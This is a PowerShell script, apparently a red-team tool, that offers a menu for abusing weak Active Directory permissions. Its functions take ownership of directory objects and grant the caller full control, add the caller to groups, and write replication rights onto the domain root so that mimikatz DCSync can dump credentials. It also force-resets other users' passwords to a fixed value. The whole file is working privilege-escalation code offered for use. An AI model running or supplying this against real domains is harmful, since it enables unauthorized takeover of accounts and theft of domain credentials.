#Basic menu structure was borrowed from https://adamtheautomator.com/powershell-menu/
#The idea of the tool was inspired by Will Shroeder's PowerView: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

#Set the pre-reqs first
$CurrentPath = (Get-Location).Path
Import-Module ActiveDirectory
Set-Location AD:
$me = (Get-ADUser $env:USERNAME).DistinguishedName
$root = (Get-ADDomain).DistinguishedName


# --- Show the menu ---
function Show-Menu {
    param (
        [string]$Title = "Mishky's Dangerous Rights Abuse Tool"
    )
    Clear-Host
    Write-Host "================ $Title ================"
    
    Write-Host "1. Take Ownership, then grant Full Control. (Use if you have WriteOwner.)"
    Write-Host "2. Grant yourself Full Control. (Use if you have WriteDACL.)"
    Write-Host "3. Add yourself to a group. (Use if you have Self, WriteProperty, etc.)"
    Write-Host "4. Give yourself DCSync rights. (Use if you have ExtendedRight on the domain root.)"
    Write-Host "5. Reset a user's password. (Use if you have ExtendedRight on the user.)"
    Write-Host "6. Check Mishka's Dangerous Rights Cheatsheet. (Use if you're lost.)"
    Write-Host "Q. Press 'Q' to quit."
}


# --- Option 1, take ownership of an AD object, then give yourself GenericAll ---
function Take-Ownership {
Try
{

$target = Read-Host "Enter the SamAccountName of the user or group you want to take control of."

If(Get-ADObject -Filter {SamAccountName -eq $target})
{
$victim = (Get-ADObject -Filter {SamAccountName -eq $target}).DistinguishedName
$acl = Get-Acl $victim
$user = New-Object System.Security.Principal.SecurityIdentifier (Get-ADUser -Identity $me).SID
$acl.SetOwner($user)
Set-ACL $victim $acl
Give-GenericAll
} #Close the If

Else {Write-Host "The specified SamAccountName does not exist."}

} #Close the Try
Catch {Write-Host "You made a typo somewhere in your input, or you lack the rights required (WriteOwner). Please enumerate again."}
} #Close the function


# --- Option 2, Give yourself GenericAll rights ---
function Give-GenericAll {
Try
{

$target = Read-Host "Enter the SamAccountName of the user or group you want to get GenericAll over."

If(Get-ADObject -Filter {SamAccountName -eq $target})
{
$victim = (Get-ADObject -Filter {SamAccountName -eq $target}).DistinguishedName
$acl = Get-Acl $victim
$user = New-Object System.Security.Principal.SecurityIdentifier (Get-ADUser -Identity $me).SID
$acl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule $user,”GenericAll”,”ALLOW”,([GUID](“00000000-0000-0000-0000-000000000000”)).guid,”None”,([GUID](“00000000-0000-0000-0000-000000000000”)).guid))
#Apply above ACL rules
Set-Acl $victim $acl
} #Close the If

Else {Write-Host "The specified SamAccountName does not exist."}

} #Close the try
Catch {Write-Host "You made a typo somewhere in your input, or you lack the rights required (WriteDACL). Please enumerate again."}
} #Close the function


# --- Option 3, add oneself to a group ---
function Add-Yourself {
Try 
{

$target = Read-Host "Enter the SamAccountName of the group you want to add yourself to."
$class = (Get-ADObject -Filter {SamAccountName -eq $target}).ObjectClass

If($class -eq "group") {Add-ADGroupMember -Identity $target -Members $me}
ElseIf($class -eq $null) {Write-Host "The specified SamAccountName does not exist."}
ElseIf($class -ne "group") {Write-Host "The target must be a group."}

} #Close the try
Catch {Write-Host "You made a typo somewhere in your input, or you lack the rights required (GenericAll, Self, etc). Please enumerate again. Run Options 1 or 2 first if necessary."}
} #Close the function


# --- Option 4, Give yourself DCSync rights ---
function Give-DCSync {
Try
{
$acl = Get-Acl $root
$user = New-Object System.Security.Principal.SecurityIdentifier (Get-ADUser -Identity $me).SID
$acl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule $user,”ExtendedRight”,”ALLOW”,([GUID](“1131f6ad-9c07-11d1-f79f-00c04fc2dcd2”)).guid,”None”,([GUID](“00000000-0000-0000-0000-000000000000”)).guid))
$acl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule $user,”ExtendedRight”,”ALLOW”,([GUID](“1131f6aa-9c07-11d1-f79f-00c04fc2dcd2”)).guid,”None”,([GUID](“00000000-0000-0000-0000-000000000000”)).guid))
#Apply above ACL rules
Set-Acl $root $acl
Write-Host "Run mimikatz DCSync immediately. This change is temporary as SDProp will reset it within one hour."

} #Close the try
Catch {Write-Host "Error, you probably don't have the rights required (WriteDACL). Please enumerate again."}
} #Close the function


# --- Option 5, Reset a given user's password ---
function Reset-Password {
$target = Read-Host "Enter the SamAccountName of the user whose password you want to reset."
If(Get-ADUser -Filter {SamAccountName -eq $target})
{

Try
{
Set-ADAccountPassword -Identity $target -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password00!!" -Force)
Write-Host "$target password is now Password00!! . Enjoy."

} #Close the try
Catch {Write-Host "Error, you probably don't have the rights required (GenericAll, ExtendedRight with GUID all 0s, etc). Please enumerate again. If you have WriteOwner or WriteDACL then use options 1 or 2 first."}
} #Close the If
Else {Write-Host "The target must be a user's SamAccountName"}
} #Close the function


# --- Option 6, Launch the default browser and open Mishka's Dangerous Rights Cheatsheet
function Get-Cheatsheet {
Try {Start-Process "https://happycamper84.medium.com/dangerous-rights-cheatsheet-33e002660c1d"}
Catch {Write-Host "Error, your browser is broken, or you ran this on a disconnected system."}
} #Close the function


# --- Get the user's menu choice & run the proper function ---
Do
 {
    Show-Menu
    $selection = Read-Host "Please make a selection"
    switch ($selection)
    {
    
    '1'
    {
        'You chose option #1'
        Take-Ownership
    } 
    
    '2' 
    {
        'You chose option #2'
        Give-GenericAll
    }
    
    '3'
    {
        'You chose option #3'
        Add-Yourself
    }

    '4'
    {
        'Please note that this is temporary. SDProp will undue it within an hour. Run Mimikatz DCSync ASAP after this.'
        Give-DCSync
    }

    '5'
    {
        'You chose option #5'
        Reset-Password
    }

    '6'
    {
        'You chose option #6'
        Get-Cheatsheet
    }

    }
    pause
 }
 Until ($selection -eq 'q')

 Write-Host "We hope you enjoyed Mishka's Dangerous Rights Abuse tool."
 Write-Host "Please leave any suggestions in the comments of the Medium writeup on Mishka's Red Team tool."
 Set-Location $CurrentPath